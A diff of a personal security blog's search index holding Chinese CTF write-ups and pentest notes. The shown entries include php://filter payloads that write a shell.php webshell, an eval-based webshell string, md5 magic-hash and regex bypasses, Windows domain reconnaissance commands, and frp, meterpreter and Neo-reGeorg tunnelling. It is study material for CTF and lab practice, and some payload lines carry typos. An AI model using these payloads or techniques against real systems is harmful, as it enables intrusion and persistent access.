+<span id="more"></span>
+
+<blockquote>
+<p>Payload:     </p>
+<p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
+<p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
+</blockquote>
+<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>base64可打印（A-Z a-z 0-9 +/）<code>=</code>补位  ,遇到不符合的字符会跳过，所以&lt; ? ; ? &gt;; 和空格 七个字符不符合，</p>
+<p>最终解码只有<code>phpexit</code>7个字符，base64解码是4个一组的，所有要在shell前面加个a,</p>
+<blockquote>
+<p>Payload: </p>
+<p>/?txt=aPD9waHAgcGhwaW5mbygpOz8+&amp;filename=php://filter/write=convert.base64-deconde/resource=shell.php       //PD9waHAgcGhwaW5mbygpOz8+前面要多加一个a</p>
+</blockquote>
+<hr>
+<p>参考博客：<a href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>file_put_content</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VNCTF2021-web</title>
     <url>/2021/03/29/VNCTF2021-web/</url>
     <content><![CDATA[<h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p><img src="/2021/03/29/VNCTF2021-web/1.png" alt="1"></p>
@@ -421,42 +515,6 @@
       </categories>
       <tags>
         <tag>VNCTF2021-web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>file_put_content利用(php://filter协议)</title>
-    <url>/2020/10/25/file-put-contents%E5%88%A9%E7%94%A8-php-filter%E5%8D%8F%E8%AE%AE/</url>
-    <content><![CDATA[<hr>
-<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. <span class="variable">$filename</span>;</span><br><span class="line">file_put_content(<span class="variable">$filename</span>,<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
-<span id="more"></span>
-
-<blockquote>
-<p>Payload:     </p>
-<p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
-<p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
-</blockquote>
-<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
-
-
-
-<p>base64可打印（A-Z a-z 0-9 +/）<code>=</code>补位  ,遇到不符合的字符会跳过，所以&lt; ? ; ? &gt;; 和空格 七个字符不符合，</p>
-<p>最终解码只有<code>phpexit</code>7个字符，base64解码是4个一组的，所有要在shell前面加个a,</p>
-<blockquote>
-<p>Payload: </p>
-<p>/?txt=aPD9waHAgcGhwaW5mbygpOz8+&amp;filename=php://filter/write=convert.base64-deconde/resource=shell.php       //PD9waHAgcGhwaW5mbygpOz8+前面要多加一个a</p>
-</blockquote>
-<hr>
-<p>参考博客：<a href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>file_put_content</tag>
       </tags>
   </entry>
   <entry>
@@ -545,7 +603,10 @@
   <entry>
     <title>php漏洞</title>
     <url>/2021/01/28/php%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="0x01-php双引号解析漏洞"><a href="#0x01-php双引号解析漏洞" class="headerlink" title="0x01 php双引号解析漏洞"></a>0x01 php双引号解析漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ft</span></span><br><span class="line"><span class="comment"> * user: shmily-ing</span></span><br><span class="line"><span class="comment"> * Data: 2021/1/28 15:25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span><span class="subst">$b</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a$b&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果:</span></span><br><span class="line"><span class="comment">21</span></span><br><span class="line"><span class="comment">$a$b</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+    <content><![CDATA[<ul>
+<li>持续更新</li>
+</ul>
+<h2 id="0x01-php双引号解析漏洞"><a href="#0x01-php双引号解析漏洞" class="headerlink" title="0x01 php双引号解析漏洞"></a>0x01 php双引号解析漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ft</span></span><br><span class="line"><span class="comment"> * user: shmily-ing</span></span><br><span class="line"><span class="comment"> * Data: 2021/1/28 15:25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span><span class="subst">$b</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$a$b&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果:</span></span><br><span class="line"><span class="comment">21</span></span><br><span class="line"><span class="comment">$a$b</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
 
 <p>输出结果不同，双引号和单引号都表示字符串，但双引号会对引号内容进行二次解释，就可能出现安全问题。</p>
 <span id="more"></span>
@@ -553,6 +614,34 @@
 <p>所以双引号内出现<code>$&#123;&#125;</code>, <code>&#123;&#125;</code>内的内容就会被当作php代码执行</p>
 <p><code>$&#123;php命令&#125;</code>例如： “${@eval($_POST[‘a’])}”</p>
 <p>但适用于php5.5以上的版本</p>
+<h2 id="0x02-php类型"><a href="#0x02-php类型" class="headerlink" title="0x02  php类型"></a>0x02  php类型</h2><p>####类型转换</p>
+<p>php把以<code>字母</code>开头的<code>字符或字符串</code>转化为<code>整型</code>时候，会变成<code>0</code>:<code>&#39;a123456&#39;==0</code></p>
+<p>php把以<code>数字</code>开头的<code>字符串</code>转化为<code>整型</code>时候，只取到第一个字母之前的数字:<code>&#39;123456a111&#39;==123456</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(&quot;a&quot;&#x3D;&#x3D;0);</span><br><span class="line">var_dump(&quot;a&quot;&#x3D;&#x3D;&quot;0&quot;);</span><br><span class="line">var_dump(&#39;123456a111&#39;&#x3D;&#x3D;123456);</span><br><span class="line">var_dump(&#39;a123456&#39;&#x3D;&#x3D;0);</span><br></pre></td></tr></table></figure>
+
+<p>结果为：</p>
+<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20210721005633561.png" alt="image-20210721005633561"></p>
+<h4 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h4><p>PHP在处理哈希字符串时，”OE”开头的都认为<code>0</code></p>
+<p>以下值在md5加密后以0E开头：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- QNKCDZO</span><br><span class="line">- 240610708</span><br><span class="line">- s878926199a</span><br><span class="line">- s155964671a</span><br><span class="line">- s214587387a</span><br><span class="line">- s214587387a</span><br></pre></td></tr></table></figure>
+
+
+
+<p>以下值在sha1加密后以0E开头：</p>
+<ul>
+<li>sha1(‘aaroZmOk’)</li>
+<li>sha1(‘aaK1STfY’)</li>
+<li>sha1(‘aaO8zKZF’)</li>
+<li>sha1(‘aa3OFF9m’)</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$name</span>)==md5(<span class="variable">$passwd</span>)&amp;&amp;<span class="variable">$name</span>!=<span class="variable">$passwd</span>)&#123;</span><br><span class="line">  var_dump(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/?name=QNKCDZO&amp;passwd=<span class="number">240610708</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$name</span>)===md5(<span class="variable">$passwd</span>)&amp;&amp;<span class="variable">$name</span>!==<span class="variable">$passwd</span>)&#123;</span><br><span class="line">  var_dump(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/?name[]=<span class="number">1</span>&amp;passwd[]=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>md5([1])===md5([2])==NULL</code></li>
+</ol>
+<h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p><a href="https://blog.csdn.net/qq_19980431/article/details/83018232">参考</a></p>
 ]]></content>
       <categories>
         <category>php</category>
@@ -790,21 +879,29 @@
 
 <span id="more"></span>
 
+<p>ipconfig /all</p>
+<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621092728.png" alt="image-20210621092721554" style="zoom:150%;">
 
 
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621092728.png" alt="image-20210621092721554"></p>
+
+<p>net  user</p>
+<p>net localgroup administrators </p>
 <img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621095850.png" alt="20210621095850" style="zoom:150%;">
 
+<p>wmic product get name,version </p>
+<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100332.png" alt="20210621100332">
+
+<p>powershell “Get-WmiObject -class Win32_Product | Select-Object -Property name,Version” </p>
+<img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100357.png" alt="20210621100357">
 
 
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100332.png" alt="20210621100332"></p>
-<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621100357.png" alt="20210621100357"></p>
+
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621101825.png" alt="20210621101825"></p>
 <img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20210621112046.png" alt="20210621112046" style="zoom:150%;">
 
 
 
-<h4 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                    #查看本地共享资源</span><br></pre></td></tr></table></figure>
+<h4 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br></pre></td></tr></table></figure>
 
 
 
@@ -826,6 +923,18 @@
       </categories>
       <tags>
         <tag>内网信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网横向渗透</title>
+    <url>/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<p>待更新</p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网横向渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -868,18 +977,13 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.1.102   #vps-ip</span><br><span class="line">server_port &#x3D; 6000            #本机绑定的端口</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">tpye &#x3D; tcp</span><br><span class="line">remote_port &#x3D;10010</span><br><span class="line">plugin &#x3D; socks5</span><br></pre></td></tr></table></figure>
 
-
-
-<h2 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h2><p><a href="https://blog.csdn.net/ws13129/article/details/94395905">https://blog.csdn.net/ws13129/article/details/94395905</a></p>
-<blockquote>
+<h2 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h2><blockquote>
 <p>kali</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">portfwd add ‐l 33333 ‐r 192.168.1.102 ‐p 3389  将192.168.1.102的3389端口转发到kali 33333端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">portfwd add ‐l 33333 ‐r 192.168.1.102 ‐p 3389      将192.168.1.102的3389端口转发到kali 33333端口</span><br></pre></td></tr></table></figure>
 
-
-
-
-
+<p>在meterpreter会话口将端口转发出来，</p>
+<p><a href="https://blog.csdn.net/ws13129/article/details/94395905">参考</a></p>
 <hr>
 <p>下面测试代理的环境：</p>
 <p>本地主机：192.168.1.101</p>
@@ -959,7 +1063,7 @@
 
 
 <h2 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h2><p>人家魔改的,我的靶机还是报错，，，感觉这个还是有点限制的</p>
-<p>本机win：</p>
+<p>本机：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python neoreg.py generate -k zzz</span><br><span class="line">python neoreg.py -k zzz -u http:&#x2F;&#x2F;192.168.1.102&#x2F;tunnel.php  -p 10010</span><br></pre></td></tr></table></figure>
 
 ]]></content>
@@ -1055,12 +1159,148 @@
 <p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.5.24/2.png" alt="2"></p>
 <p><a href="http://cb05b76c-5a4d-493d-b445-e9e887b65582.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;&amp;file=useless.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:%7Bs:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;%7D">http://cb05b76c-5a4d-493d-b445-e9e887b65582.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;&amp;file=useless.php&amp;&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p>
 <p>F12获得flag</p>
+<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><ul>
+<li>2021.7.21</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><code>md5($id) === md5($gg) &amp;&amp; $id !== $gg</code>   php强比较绕过</p>
+</li>
+</ol>
+<p><code>id[]=1&amp;gg[]=2</code>，传入数组，虽然会报错但md5返回结果为空，NULL=NULL绕过md5，</p>
+<ol start="2">
+<li>is_numeric()函数用1234567a绕过，1234567a会被当做字符串，转换整型时候把a去掉</li>
+</ol>
+<p>##[MRCTF2020]套娃1</p>
+<ul>
+<li>2020.7.21</li>
+</ul>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721161850938.png" alt="image-20210721161850938"></p>
+<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>可以获得我们传的参数变量和值，如下解释：</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210721162009856.png" alt="image-20210721162009856"></p>
+<p><code>%20</code>代替<code>_</code>绕过第一个if检测(查询字符串在解析的过程中会将空白符删除或用将某些字符转换为下划线（包括<code>空格</code>，<code>[</code>）)   或者用<code>%5F</code>代替<code>_</code></p>
+<p><a href="https://www.freebuf.com/articles/web/213359.html">参考</a></p>
+<p><code>%0a</code>绕过第二个正则（超级实用）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151026286.png" alt="image-20210723151026286"></p>
+<p>jsfuck加密</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151432092.png" alt="image-20210723151432092"></p>
+<p>复制到控制台</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723151501201.png" alt="image-20210723151501201"></p>
+<p>随便post   Merak一个值</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210723160659019.png" alt="image-20210723160659019"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it? </span><br><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>xff不行，用client-ip:127.0.0.1</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?2333&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure>
+
+<p>file 需要写个解密poc</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210724015309274.png" alt="image-20210724015309274"></p>
+<p>file=ZmpdYSZmXGI=</p>
+<p><img src="/2020/11/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2021.7.21/image-20210724015407359.png" alt="image-20210724015407359"></p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
         <tag>buu刷题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>面经</title>
+    <url>/2021/07/01/%E9%9D%A2%E7%BB%8F/</url>
+    <content><![CDATA[<h2 id="赛宁网安"><a href="#赛宁网安" class="headerlink" title="赛宁网安"></a>赛宁网安</h2><p>信息安全实习生（南京实习）</p>
+<h4 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h4><p>2021.6 电话面试（hr邀请）</p>
+<ul>
+<li>sql注入有回显和没有回显，怎么处理</li>
+<li>sql注入过滤绕过</li>
+<li>xss绕过</li>
+<li>csrf利用</li>
+</ul>
+<span id="more"></span>
+
+<ul>
+<li>文件上传利用，绕过</li>
+<li>中间件一些（解析）漏洞</li>
+<li>php反序列化，php文件包含</li>
+<li>php代码审计的一些东西</li>
+<li>ssrf利用，出现在哪些地方</li>
+<li>redis  getshell 的几种方式</li>
+<li>mysql提权</li>
+<li>windows/linux提权</li>
+<li>mssql提权</li>
+<li>给你一个域名，说下你的渗透测试思路</li>
+<li>护网的一些经历</li>
+</ul>
+<p>感觉也有部分没有回答出来，提权和redis那块不是很了解。</p>
+<p>总体来说面的很全面，面试官很好，只有一面，很快通过了。</p>
+<p>在boss直聘上投的。</p>
+<h2 id="长亭科技"><a href="#长亭科技" class="headerlink" title="长亭科技"></a>长亭科技</h2><p>安全服务实习生（南京实习）</p>
+<h4 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h4><p>2021.6 电话面试</p>
+<ul>
+<li>不想写了，反正是非常基础的知识原理(基础web+代码审计+渗透测试流程)。</li>
+</ul>
+<p>这是上海给我面的，感觉面试官很好，比较简单，考察不深，我说他们搞错了，然后二面转南京了。</p>
+<h4 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h4><p>2021.6 视频面试</p>
+<ul>
+<li><p>自我介绍，紧张到嘴瓢。。</p>
+</li>
+<li><p>报错注入函数</p>
+</li>
+</ul>
+<p>updataxml()，extractvalue()紧张到忘了第一个都忘了，日了。然后问还有其他的吗？？我？</p>
+<ul>
+<li>xml全称</li>
+</ul>
+<p>不会了。（EXtensible Markup Language）</p>
+<ul>
+<li>http-only怎么绕过</li>
+</ul>
+<p>以前看过的，忘了。</p>
+<ul>
+<li>SQL盲注怎样提高效率</li>
+</ul>
+<p>回答二分法，（结束后百度的<a href="https://www.freebuf.com/articles/web/231741.html%EF%BC%89">https://www.freebuf.com/articles/web/231741.html）</a></p>
+<ul>
+<li>domxss能被waf拦截吗</li>
+</ul>
+<p>肯定不能啊，巴拉巴拉说了一下。</p>
+<ul>
+<li>domxss发生在DOM文档里面还是外面</li>
+</ul>
+<p>我说在DOM节点上</p>
+<ul>
+<li>本地文件包含getshell方式</li>
+</ul>
+<ol>
+<li>包含jpg文件（有木马）去getshell</li>
+<li>读配置文件</li>
+<li>伪协议（data忘记了）</li>
+</ol>
+<p>问我还有吗，后面就不知道了。</p>
+<ul>
+<li>代码审计了解吗，审计过什么</li>
+</ul>
+<p>说下自己打ctf遇见的一些题目，还有dedecms，还有些忘记了，就说没有了。</p>
+<ul>
